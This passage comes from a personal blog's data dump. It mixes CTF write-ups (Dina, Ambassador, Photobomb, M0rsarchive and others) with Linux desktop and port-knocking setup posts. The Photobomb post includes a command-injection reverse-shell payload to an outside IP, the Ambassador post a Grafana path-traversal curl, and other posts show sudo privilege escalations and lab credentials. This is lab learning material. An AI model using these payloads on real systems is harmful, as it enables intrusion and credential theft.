else.[https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh]I like this one, there is lot of colors.I think I foud it. We can edit connect.py to open a revershell with an another port,and listen with netcatIt’s not working, let’s see more informations. Ok this file is not for now, I think I have to find the user first, not the root. cat &#x2F;var&#x2F;www&#x2F;wolfcms&#x2F;config.php &#x2F;&#x2F; Database settings: define(&#39;DB_DSN&#39;, &#39;mysql:dbname&#x3D;wolf;host&#x3D;localhost;port&#x3D;3306&#39;); define(&#39;DB_USER&#39;, &#39;root&#39;); define(&#39;DB_PASS&#39;, &#39;john@123&#39;); define(&#39;TABLE_PREFIX&#39;, &#39;&#39;); The user is not working for root, but for sickos it’s good. ssh sickos@192.168.0.26 john@123 Now I’m gonna run the enumeration script with the user sickOS sudo su I’m root. ) ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Dinae","slug":"CTF Dinae","date":"2022-01-09T04:16:00.000Z","updated":"2023-04-12T14:59:07.893Z","comments":true,"path":"/post/CTF Dinae.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Dinae.html","excerpt":"","text":"CTF DinaeCTF Linux Created At : 2022-01-08 22:16 Count:556 Views 👀 :2188 Discoveryhttps://www.vulnhub.com/entry/dina-101,200/ DescriptionWelcome to Dina 1.0.1 ****-——-_ ___ _———-/__/_****-—\\\\ //_ _ \\ //////——-/****/_-—|| (( | ))) ||//——/_/-–\\ ((\\ = / ))) //—-//_**–))) \\ )))—/**_/_/ ((( (((/| -))) - )) This is my first Boot2Root - CTF VM. I hope you enjoy it. if you run into any issue you can find me on Twitter: @touhidshaikh22 Contact: touhidshaikh22 at gmaill.com &lt;- Feel Free to write mail Website: http://www.touhidshaikh.com Goal: /root/flag.txt Level: Beginner (IF YOU STUCK ANYwhere PM me for HINT, But I don’t think need any help). Download: https://drive.google.com/file/d/0B1qWCgvhnTXgNUF6Rlp0c3Rlb0k/view Try harder!: If you are confused or frustrated don’t forget that enumeration is the key! Feedback: This is my first boot2root - CTF Virtual Machine, please give me feedback on how to improve! Tested: This VM was tested with: Virtual Box 5.X Networking: DHCP service: Enabled IP address: Automatically assign Fixing: Some challenge issue reported by @eliot Looking forward to the write-ups!Doesn’t work with VMware. Virtualbox only. v1 - 10/07/2017 v1.0.1 - 17/10/2017 Scaanningnetdiscoversudo netdiscover 192.168.0.27 nmapOnly the port 80 iss open. sudo nmap 192.168.0.27 -sV -p- gobustergobuster dir -x * -u http:&#x2F;&#x2F;192.168.0.27 -w Documents&#x2F;wordlist&#x2F;directory-list-common.txt /cgi-bin/ (Status: 403) [Size: 288]/index (Status: 200) [Size: 3618]/secure (Status: 301) [Size: 313] –&gt; [http://192.168.0.27/secure/]/tmp (Status: 301) [Size: 310] –&gt; [http://192.168.0.27/tmp/]/uploads (Status: 301) [Size: 314] –&gt; [http://192.168.0.27/uploads/] In secure we have a zip file.And in this zip file we have a file “backup-cred.mp3”I can’t extract ip because there is a password. In index we have this page, with a buton “submit query” In the robots.txt we have something.User-agent: *Disallow: /ange1Disallow: /angel1Disallow: /nothingDisallow: /tmpDisallow: /uploads In Nothing, in the code source we have this. my secret passfreedompasswordhelloworld!dianailoveroot Freedom is the password of “backup cred.mp3” It’s a text file. I am not toooo smart in computer …….dat the resoan i always choose easy password…with creds backup file…. uname: touhidpassword: ****** url : /SecreTSMSgatwayLogin% Let’s see what is it. The username should be touhid, let’s try every password is the txt file.The password is diana.In the code source we have this.kurakura cinta kamu.......sampai mati...I wanted to see the version of the web app to exploit it but I can’t find it.The application is `playSMS Exploithttps://www.exploit-db.com/exploits/44598 I’m gonna use this one with metasploit.I had to install kali linux because I have an error with Arch Linux (Yeah I use it,BTW). The &quot;shell&quot; command is not supported by this Meterpreter type (php/php)I will fix the error later.Resolution scale goes BBRRrrrrrrrrr. I upgrade my shell with /bin/sh -ihttps://netsec.ws/?p=337 sudo -l to see what I can do, I also search in the home directory but there is nothing interesting. So I can run perl as root without password.https://gtfobins.github.io/gtfobins/perl/I’m gonna try the first one. sudo perl -e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39; Nice.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Switch from i3 to bspwm","slug":"Switch from i3 to bspwm","date":"2022-01-01T07:37:00.000Z","updated":"2023-04-12T14:41:17.131Z","comments":true,"path":"/post/Switch from i3 to bspwm.html","link":"","permalink":"https://peanutstick.github.io/post/Switch%20from%20i3%20to%20bspwm.html","excerpt":"","text":"Why bspwm.Because I had some issues with discord, it was slow and i3 is pretty old.I wanted to try something else. How I installled bspwm.Install bspwmsudo pacman -S bspwm Create the config filesinstall -Dm755 &#x2F;usr&#x2F;share&#x2F;doc&#x2F;bspwm&#x2F;examples&#x2F;bspwmrc ~&#x2F;.config&#x2F;bspwm&#x2F;bspwmrc install -Dm644 &#x2F;usr&#x2F;share&#x2F;doc&#x2F;bspwm&#x2F;examples&#x2F;sxhkdrc ~&#x2F;.config&#x2F;sxhkd&#x2F;sxhkdrc sxhkdrc is used to create the shortcuts. I had to launch bspwm and disable i3.I’ve done it in the xfce pannel instead of ‘/etc/X11/xinit/xinitrc’, because it was not working and I like how I can do it with xfce. Sxhkd config# # wm independent hotkeys # # terminal emulator super + Return kitty # program launcher super + d dmenu_run # make sxhkd reload its configuration files: super + Escape pkill -USR1 -x sxhkd # # bspwm hotkeys # # quit&#x2F;restart bspwm super + alt + &#123;q,r&#125; bspc &#123;quit,wm -r&#125; # close and kill super + &#123;_,shift + &#125;w bspc node -&#123;c,k&#125; # alternate between the tiled and monocle layout super + m bspc desktop -l next # send the newest marked node to the newest preselected node super + y bspc node newest.marked.local -n newest.!automatic.local # swap the current node and the biggest window # # state&#x2F;flags # # set the window state super + &#123;t,shift + t,s,f&#125; bspc node -t &#123;tiled,pseudo_tiled,floating,fullscreen&#125; # # focus&#x2F;swap # # focus the node in the given direction super + &#123;_,shift + &#125;&#123;Left,Down,Up,Right&#125; bspc node -&#123;f,s&#125; &#123;west,south,north,east&#125; # focus the node for the given path jump super + &#123;p,b,comma,period&#125; bspc node -f @&#123;parent,brother,first,second&#125; # focus the last node&#x2F;desktop super + &#123;grave,Tab&#125; bspc &#123;node,desktop&#125; -f last super + &#123;_,shift + &#125;&#123;1-9,0&#125; bspc &#123;node -d, desktop -f&#125; &#39;^&#123;1-9,10&#125;&#39; #super + &#123;_,shift + &#125;&#123;1-9,0&#125; # bspc node -d &#39;^&#123;1-9,10&#125;&#39; super + &#123;ampersand,eacute,quotedbl,apostrophe,parenleft,section,egrave,exclam,ccedilla&#125; bspc desktop -f &#39;^&#123;1-9,10&#125;&#39; # bscp desktop -f &#123;1-9,10&#125; alt + shift + &#123;Left,Right,Up,Down&#125; dir&#x3D;&#123;west,east,north,south&#125;; \\ bspc node -s &quot;$dir.local&quot; --follow \\ || bspc node -m &quot;$dir&quot; --follow # # preselect # # preselect the direction super + ctrl + &#123;Left,Down,Up,Right&#125; bspc node -p &#123;west,south,north,east&#125; # preselect the ratio super + ctrl + &#123;1-9&#125; bspc node -o 0.&#123;1-9&#125; # cancel the preselection for the focused node super + ctrl + space bspc node -p cancel # # move&#x2F;resize # # expand a window by moving one of its side outward super + alt + &#123;Left,Down,Up,Right&#125; bspc node -z &#123;Left -20 0,bottom 0 20,top 0 -20,right 20 0&#125; # contract a window by moving one of its side inward super + alt + shift + &#123;Left,Down,Up,Right&#125; bspc node -z &#123;right -20 0,top 0 20,bottom 0 -20,left 20 0&#125; # move a floating window super + &#123;Left,Down,Up,Right&#125; bspc node -v &#123;-20 0,0 20,0 -20,20 0&#125; Bspwm config#! &#x2F;bin&#x2F;sh pgrep -x sxhkd &gt; &#x2F;dev&#x2F;null || sxhkd &amp; bspc monitor -d 1 2 3 4 5 bspc config border_width 2 bspc config window_gap 12 bspc config split_ratio 0.52 bspc config borderless_monocle true bspc config gapless_monocle true bspc rule -a Gimp desktop&#x3D;&#39;^8&#39; state&#x3D;floating follow&#x3D;on bspc rule -a Chromium desktop&#x3D;&#39;^2&#39; bspc rule -a mplayer2 state&#x3D;floating bspc rule -a Kupfer.py focus&#x3D;on bspc rule -a Screenkey manage&#x3D;off","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"my spyware is stuck in the login loop (Microsoft teams)","slug":"Fix my spyware is stuck in the login loop (Microsoft teams)","date":"2021-12-28T03:15:00.000Z","updated":"2023-04-12T14:58:06.457Z","comments":true,"path":"/post/Fix my spyware is stuck in the login loop (Microsoft teams).html","link":"","permalink":"https://peanutstick.github.io/post/Fix%20my%20spyware%20is%20stuck%20in%20the%20login%20loop%20(Microsoft%20teams).html","excerpt":"","text":"ProblemMy problem is in the title, I can’t use teams because I’m stuck in the login loop.It’s the same with the apps From the AUR, teams and teams for linux. Solution 1Clear the config file.Not working for me. rm -r ~&#x2F;.config&#x2F;teams-for-linux rm -r ~&#x2F;.config&#x2F;Microsoft&#x2F; Try via the browserNop still the same Change the dateI’s the solution for me, it’s weird because I had the right date/time.On discord (an another spyware) the time was wrong too. The NTP was inactive. timedatectl set-ntp true systemctl start systemd-timesyncd.service systemctl enable systemd-timesyncd.service timedatectl set-timezone Europe&#x2F;Paris I set Europe/Paris because I’m french.","categories":[{"name":"Fix","slug":"Fix","permalink":"https://peanutstick.github.io/categories/Fix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF IMF","slug":"CTF IMF","date":"2021-12-25T09:15:00.000Z","updated":"2023-04-12T14:58:06.457Z","comments":true,"path":"/post/CTF IMF.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20IMF.html","excerpt":"","text":"netdiscover 192.168.0.15 rustscanOnly the port 80 is open Port 80Apache/2.4.18 First flagview-source:http://192.168.0.15/contact.phpflag1{YWxsdGhlZmlsZXM=}allthefiles second flag ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ&#x3D;&#x3D; Flag2: echo \"ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==\" | base64 --decode flag2&#123;aW1mYWRtaW5pc3RyYXRvcg==&#125; echo \"aW1mYWRtaW5pc3RyYXRvcg==\" | base64 --decode imfadministrator Login pagehttp://192.168.0.15/imfadministrator/ Roger is a user.The password is hard coded in the cookie. If I delete it he recreate an another cookie. So, I have to create my own cookie.The password may be good, but we also need the username.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Tr0ll","slug":"CTF Tr0ll","date":"2021-12-25T09:15:00.000Z","updated":"2023-04-12T14:58:06.457Z","comments":true,"path":"/post/CTF Tr0ll.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Tr0ll.html","excerpt":"","text":"Discoveryhttps://www.vulnhub.com/entry/tr0ll-1,100/ Tr0ll was inspired by the constant trolling of the machines within the OSCP labs.The goal is simple, gain root and get Proof.txt from the /root directory.Not for the easily frustrated! Fair warning, there be trolls ahead!Difficulty: Beginner ; Type: boot2root Scanningnetdiscoversudo netdiscover nmapnmap -sV -p- 192.168.0.24 Port 80 There is nothing intresting in the source code of this page.Let’s see what is in the robots.txt. User-agent:* Disallow: &#x2F;secret …yes Dirbuster Too many errors for me, I will search for something else. Nikto Nothing intresting on the port 80, I already know for the secret and robot.txt.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"How do I setup nitrogen & pywal","slug":"How do I setup nitrogen & pywal","date":"2021-12-25T09:15:00.000Z","updated":"2023-04-12T14:58:06.457Z","comments":true,"path":"/post/How do I setup nitrogen & pywal.html","link":"","permalink":"https://peanutstick.github.io/post/How%20do%20I%20setup%20nitrogen%20&%20pywal.html","excerpt":"","text":"What I wantI want to change my background and the color of my terminal with one command. RequirementNitrogensudo pacman -S nitrogen pyWalYou can found it on the AUR.I’m gonna use yay to install it.you can also use wal for discord and spotify.yay -Ss pywalLet’s install it.yay -S python-pywal Aliascommand for nitrogentnitrogen --set-auto image.png Command for pywalwal -i image.png Script itThe name of the alias will be walp.In my .zshrc walp()&#123; nitrogen --set-auto &quot;$1&quot; wal -i &quot;$1&quot; &#125; usage:walp image.jpg Set nitrogen at startupI’m going to edit .config/i3/config because I’m using i3 exec --no-startup-id nitrogen --restore","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Setup Xfce with i3","slug":"Setup_Xfce_with_i3","date":"2021-12-24T11:17:00.000Z","updated":"2023-04-12T14:33:07.234Z","comments":true,"path":"/post/Setup_Xfce_with_i3.html","link":"","permalink":"https://peanutstick.github.io/post/Setup_Xfce_with_i3.html","excerpt":"","text":"I have a basic install of Xfce. I also can open a new session with only i3. Install nitrogensudo pacman -S nitrogenIt will repalce the background, for the wallpaper.I don’t know what I’m currently using for my current setup with i3,but it’s not nitrogen. Remove Xfce wmGo to session &amp; startup.on the second tab you have to set i3 at startup.on the third tab, select never for xfwm4 and xfcedesktop.And remove all shortcuts in xfce, because you gonna have some problems with thoses of i3.And reboot. And voila","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Set up port knocking server to hide an open port","slug":"Set up port knocking server to hide an open port","date":"2021-10-31T07:15:00.000Z","updated":"2023-04-12T14:33:07.234Z","comments":true,"path":"/post/Set up port knocking server to hide an open port.html","link":"","permalink":"https://peanutstick.github.io/post/Set%20up%20port%20knocking%20server%20to%20hide%20an%20open%20port.html","excerpt":"","text":"What is Port Knocking ?Port knocking is a simple method to grant remote access without leaving a port constantly open.This preserves your server from port scanning and script kiddie attacks. Server SetupInstall the packageDebian: apt install knockd Configuration/etc/knockd.conf I want to hide the ssh.You have to change the sequence, because the script kiddies will try this sequence first. [options] logfile &#x3D; &#x2F;var&#x2F;log&#x2F;knockd.log [SSH] sequence &#x3D; 7000,8000,9000 seq_timeout &#x3D; 20 command &#x3D; &#x2F;sbin&#x2F;iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags &#x3D; syn cmd_timeout &#x3D; 10 stop_command &#x3D; &#x2F;sbin&#x2F;iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT You have some exemple here. ubuntu.com Enable the deamon/etc/default/knockdUncomment the START_KNOCKD=1 line to enable the daemon. ################################################ # # knockd&#39;s default file, for generic sys config # ################################################ # control if we start knockd at init or not # 1 &#x3D; start # anything else &#x3D; don&#39;t start START_KNOCKD&#x3D;1 # command line options KNOCKD_OPTS&#x3D;&quot;-i eth0&quot; Client sideLinuxYou should install knockd on the client too.knock -v 192.168.1.250 7000 8000 9000 WindowsDownload this: SourceForge-KnockKnockYou sould read the README.txtKnockKnock.zip - archive containing all files|- Shortcut to KnockKnock - Shortcut to knock client||- Shortcut to KnockMonitor - Shortcut to knock server","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Ambassador","slug":"CTF Ambassador","date":"2021-10-10T09:09:00.000Z","updated":"2023-04-12T14:58:06.457Z","comments":true,"path":"/post/CTF Ambassador.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Ambassador.html","excerpt":"","text":"Rustscanrustscan -a ambassador.htb --ulimit 5000 Website on port 80 Website on port 3000Grafana version 8.2.0CVE-2021-43798https://www.exploit-db.com/exploits/50581So, I had to download it and run it like this: python3 50581.py -H http://ambassador.htb:3000 Then, select the file I want to read (ex: /etc/passwd). /etc/grafana/grafana.ini default admin user, created on startup ;admin_user &#x3D; admin default admin password, can be changed before first start of grafana, or in profile settings admin_password &#x3D; messageInABottle685427 used for signing ;secret_key &#x3D; SW2YcwTIb9zpOOhoPsMm I’m in, I’m listing the plugins, maybe I can upload a revers shell on it.Maybe the interesting to do was searching the files with the last exploit. I have to find the password. curl --path-as-is http://ambassador.htb:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db sqlite3 grafana.db I need to find the creds of grafana to login the mysql database. SELECT * FROM data_source; 2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|&#123;&#125;|2022-09-01 22:43:03|2022-10-08 20:21:56|0|&#123;&#125;|1|uKewFgM4z Password = dontStandSoCloseToMe63221! | developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== | ssh618dafc87c795ef87e5f672b4a3902a4anEnglishManInNewYork027468","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF M0rsarchive","slug":"CTF M0rsarchive","date":"2021-10-10T09:09:00.000Z","updated":"2023-04-12T14:58:06.457Z","comments":true,"path":"/post/CTF M0rsarchive.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20M0rsarchive.html","excerpt":"","text":"CHALLENGE DESCRIPTIONJust unzip the archive … several times … Zip file We have an encrypted Zip file: flag_999.zip.And a picture: It’s a morse code, it’s mean 9.The password of flag_999.zip should be 9. So we have 999 zip files like this, I have to code something. Get the hex value of a pngconvert *.png txt:- There is 2 colors, #BC32D8 for the background and #FF3200 for the foreground. convert *.png txt:- > hex.txt grep \"#FF3200\" -C 1 hex.txt If there is 3 pixels it’s a -, if there is 1 pixel it’s a .and the – is a pace.The code should be 98. Convert to morsegrep \"#FF3200\" -C 1 hex.txt | awk '&#123; print $3 &#125;' Good, now I want it in one line and replace the space by a random char: grep \"#FF3200\" -C 1 hex.txt | awk '&#123; print $3 &#125;' | awk '!NF&#123;$0=\">\"&#125;1' | xargs Now I have to replace #FF3200 #FF3200 #FF3200 by - and #FF3200 by ..Then remove every thing who is not -, . and &gt;.Finaly replace &gt; by a space. grep \"#FF3200\" -C 1 hex.txt | awk '&#123; print $3 &#125;' | awk '!NF&#123;$0=\">\"&#125;1' | xargs | sed 's/#FF3200 #FF3200 #FF3200 /-/g' | sed 's/#FF3200 /./g' | sed 's/#BC32D8//g' |sed 's/ //g'| sed 's/>/ /g' Translate the morseNow I have this string ----- ---.., there is one space between the 2 chars, I would add one space at the end and use sed to replace it by a letter. Like this sed 's/----- /9/' sed 's/---.. /8/' This is what I wanted to do at first but my space is removed in my script, I don’t know why.So I add this &gt; at the end to have something like this: .- -... &gt; It’s working well, here is the code: #!/bin/bash code=$1 code=$(echo $code | sed 's/\\.- /A/g') code=$(echo $code | sed 's/-\\.\\.\\. /B/g') code=$(echo $code | sed 's/-\\.-\\. /C/g') code=$(echo $code | sed 's/-\\.\\. /D/g') code=$(echo $code | sed 's/\\. /E/g') code=$(echo $code | sed 's/\\.\\.-\\. /F/g') code=$(echo $code | sed 's/--\\. /G/g') code=$(echo $code | sed 's/\\.\\.\\.\\. /H/g') code=$(echo $code | sed 's/\\.\\. /I/g') code=$(echo $code | sed 's/\\.--- /J/g') code=$(echo $code | sed 's/-\\.- /K/g') code=$(echo $code | sed 's/\\.-\\.\\. /L/g') code=$(echo $code | sed 's/-- /M/g') code=$(echo $code | sed 's/-\\. /N/g') code=$(echo $code | sed 's/--- /O/g') code=$(echo $code | sed 's/\\.-- /P/g') code=$(echo $code | sed 's/--\\.- /Q/g') code=$(echo $code | sed 's/\\.-\\. /R/g') code=$(echo $code | sed 's/\\.\\.\\. /S/g') code=$(echo $code | sed 's/- /T/g') code=$(echo $code | sed 's/\\.\\.- /U/g') code=$(echo $code | sed 's/\\.\\.\\.- /V/g') code=$(echo $code | sed 's/\\.-- /W/g') code=$(echo $code | sed 's/-\\.\\.- /X/g') code=$(echo $code | sed 's/-\\.-- /Y/g') code=$(echo $code | sed 's/--\\.\\. /Z/g') code=$(echo $code | sed 's/\\.---- /1/g') code=$(echo $code | sed 's/\\.\\.--- /2/g') code=$(echo $code | sed 's/\\.\\.\\.-- /3/g') code=$(echo $code | sed 's/\\.\\.\\.\\.- /4/g') code=$(echo $code | sed 's/\\.\\.\\.\\.\\. /5/g') code=$(echo $code | sed 's/-\\.\\.\\. /6/g') code=$(echo $code | sed 's/--\\.\\.\\. /7/g') code=$(echo $code | sed 's/---\\.\\. /8/g') code=$(echo $code | sed 's/----\\. /9/g') code=$(echo $code | sed 's/----- /0/g') code=$(echo $code | sed 's/ >//g') echo $code It’s ugly, there is no loop, no if and all that shiny stuffs, only the basics but it’s working.I can do it even smaller, with multiple sed in sed in sed etc…And then the output of this will be the password for the zip file.I have to assemble everything like a lego. AssembleIn my script I have to do this: # Get Morse # Translate # Unzip # repeat Oh nooooooo !!!I just found a problem, it’s not the same hex value for every flag.png.There is 2 hex value every times, there is more background then foreground.To find the background: background=$(convert *.png txt:- | awk '&#123; print $3 &#125;' | grep \"#\" | head -n 1) foreground=$(convert *.png txt:- | awk '&#123; print $3 &#125;' | grep \"#\" | grep -v $background | head -n 1) Almost doneError 1I have a problem with tho morse code, I have to change the position of few sed command. There is few dots remaining in the password, it’s inaceptable. The error: .-. . .--. .-. = R. = E . –. = Pbut–. = GI should translate the P before the G. Error 2 The translation it good. There is only 2 colors: Ok got it … Ihad to change the password to lower case.I will use this: echo \"$&#123;a,,&#125;\" Now I have to wait. Error 3 So I’m trying manualy. The password looks good, the problem is somewhere else. fillin_CFileInfo - internal error - MAX_PATHNAME_LEN Yup, the path is very longI’ve unziped more than 150 zip files, I should move the zip file every 150 files to be closer to the root directory.I’m not gonna create an another loop, I will just use the current one. if [ $c == 850 ] || [ $c == 700 ] || [ $c == 550 ] || [ $c == 400 ] || [ $c == 250 ] || [ $c == 100 ]; Final #!/bin/bash # Get Morse ## Get colors for (( c=999; c>=0; c-- )) do if [ $c == 850 ] || [ $c == 700 ] || [ $c == 550 ] || [ $c == 400 ] || [ $c == 250 ] || [ $c == 100 ]; # To tired to play with regex then mv flag /home/peanutstick/Documents/CTF/Challenges/HTB/M0rsarchive/flag$c cd /home/peanutstick/Documents/CTF/Challenges/HTB/M0rsarchive/flag$c else cd flag fi b=$(convert *.png txt:- | awk '&#123; print $3 &#125;' | grep \"#\" | head -n 1) f=$(convert *.png txt:- | awk '&#123; print $3 &#125;' | grep \"#\" | grep -v $b | head -n 1) #echo \"Background: $b\" #echo \"Foreground: $f\" ## Replace the str code=$(convert *.png txt:- | grep $f -C 1 | awk '&#123; print $3 &#125;'| awk '!NF&#123;$0=\">\"&#125;1' | xargs | sed 's/'$f' '$f' '$f' /-/g' | sed 's/'$f' /./g' | sed 's/'$b'//g' |sed 's/ //g'| sed 's/>/ /g') code=\"$&#123;code&#125; >\" echo $code # Translate ## Group of 4 code=$(echo $code | sed 's/\\.---- /1/g') code=$(echo $code | sed 's/\\.\\.--- /2/g') code=$(echo $code | sed 's/\\.\\.\\.-- /3/g') code=$(echo $code | sed 's/\\.\\.\\.\\.- /4/g') code=$(echo $code | sed 's/\\.\\.\\.\\.\\. /5/g') code=$(echo $code | sed 's/-\\.\\.\\.\\. /6/g') code=$(echo $code | sed 's/--\\.\\.\\. /7/g') code=$(echo $code | sed 's/---\\.\\. /8/g') code=$(echo $code | sed 's/----\\. /9/g') code=$(echo $code | sed 's/----- /0/g') code=$(echo $code | sed 's/-\\.\\.\\. /B/g') code=$(echo $code | sed 's/-\\.-\\. /C/g') code=$(echo $code | sed 's/-\\.\\.- /X/g') code=$(echo $code | sed 's/-\\.-- /Y/g') code=$(echo $code | sed 's/--\\.\\. /Z/g') code=$(echo $code | sed 's/\\.--\\. /P/g') code=$(echo $code | sed 's/--\\.- /Q/g') code=$(echo $code | sed 's/\\.\\.\\.- /V/g') code=$(echo $code | sed 's/\\.\\.\\.\\. /H/g') code=$(echo $code | sed 's/\\.-\\.\\. /L/g') code=$(echo $code | sed 's/\\.--- /J/g') code=$(echo $code | sed 's/\\.\\.-\\. /F/g') code=$(echo $code | sed 's/-\\.\\. /D/g') code=$(echo $code | sed 's/--\\. /G/g') code=$(echo $code | sed 's/--- /O/g') code=$(echo $code | sed 's/\\.\\.- /U/g') code=$(echo $code | sed 's/\\.-- /W/g') code=$(echo $code | sed 's/\\.\\.\\. /S/g') code=$(echo $code | sed 's/\\.-\\. /R/g') code=$(echo $code | sed 's/-\\.- /K/g') code=$(echo $code | sed 's/\\.- /A/g') code=$(echo $code | sed 's/\\.\\. /I/g') code=$(echo $code | sed 's/-- /M/g') code=$(echo $code | sed 's/-\\. /N/g') code=$(echo $code | sed 's/\\. /E/g') code=$(echo $code | sed 's/- /T/g') password=$(echo $code | sed 's/>//g') echo \"Unzip flag_$c.zip with $password\" # Unzip 7z X flag_$c.zip -P$password -y > /dev/null 2>&amp;1 if [ $? -ne 0 ]; then password=$(echo $&#123;password,,&#125;) 7z X flag_$c.zip -P$password -y > /dev/null 2>&amp;1 fi echo \"7z X flag_$c.zip -P$password -y\" done 71 lines of code and 39 for the morse part.It was fun.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Photobomb","slug":"CTF Photobomb","date":"2021-10-10T00:09:00.000Z","updated":"2023-04-12T14:58:06.457Z","comments":true,"path":"/post/CTF Photobomb.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Photobomb.html","excerpt":"","text":"Rustscanrustscan -a photobomb.htb --ulimit 5000 Output: Open 10.129.202.206:22 Open 10.129.202.206:80 wfuzzSubdomainwfuzz -c -f subdomains -w /usr/share/wordlists/wfuzz/others/subdomains.txt -u 'http://photobomb.htb' -H \"Host: FUZZ.photobomb.htb\" --sc 200 No subdomain digdig axfr photobomb.htb @photobomb.htb Nothing Gobustergobuster dir -u http://photobomb.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html --wildcard switch |grep \"Status: 200\" WebsiteInternal portI was trying te determin if it the website can andle php or html, and I found this.The image don’t display.Also, Sinatra should be a user. SSTI ?http://photobomb.htb/&#123;&#123;7*7&#125;&#125; Source code In the js file: this is a username with the password.http://pH0t0:b0Mb!@photobomb.htb/printer Download the photos I cupy the request as curl comand. curl &#39;http:&#x2F;&#x2F;photobomb.htb&#x2F;printer&#39; -X POST -H &#39;User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:105.0) Gecko&#x2F;20100101 Firefox&#x2F;105.0&#39; -H &#39;Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&#39; -H &#39;Accept-Language: en-US,en;q&#x3D;0.5&#39; -H &#39;Accept-Encoding: gzip, deflate&#39; -H &#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39; -H &#39;Origin: http:&#x2F;&#x2F;photobomb.htb&#39; -H &#39;Authorization: Basic cEgwdDA6YjBNYiE&#x3D;&#39; -H &#39;Connection: keep-alive&#39; -H &#39;Referer: http:&#x2F;&#x2F;photobomb.htb&#x2F;printer&#39; -H &#39;Upgrade-Insecure-Requests: 1&#39; --data-raw &#39;photo&#x3D;voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype&#x3D;jpg&amp;dimensions&#x3D;3000x2000&#39; Reverse shellIf I add this in the bodu and listenj with netcat I can spawn a reverse shell.Listen: nc -nlvp 8645 Connect: photo&#x3D;almas-salakhov-VK7TCqcZTlw-unsplash.jpg&amp;filetype&#x3D;png;export RHOST&#x3D;&quot;10.10.14.93&quot;;export RPORT&#x3D;8645;python3 -c &#39;import sys,socket,os,pty;s&#x3D;socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;bash&quot;)&#39;&amp;dimensions&#x3D;1920x1080 Privilage escalationsudo -l https://book.hacktricks.xyz/linux-hardening/privilege-escalation#:~:text=LD_PRELOAD%20%26%20LD_LIBRARY_PATHCreate the payload Download it: And compile it: I have to compile it myself… This is fine.Then send it to the target and run it.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Trick","slug":"CTF Trick","date":"2021-10-06T07:40:00.000Z","updated":"2023-04-12T14:41:17.131Z","comments":true,"path":"/post/CTF Trick.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Trick.html","excerpt":"","text":"/etc/hosts10.10.11.166 trick.htb Rustscanrustscan -a trick.htb Output: PORT STATE SERVICE REASON 22&#x2F;tcp open ssh syn-ack 25&#x2F;tcp open smtp syn-ack 80&#x2F;tcp open http syn-ack wfuzzSo I’ve tried to list the directories and the subdomains, but there is nothing.It’s not the real website, I have to dig deeper. Digdig a trick.htb 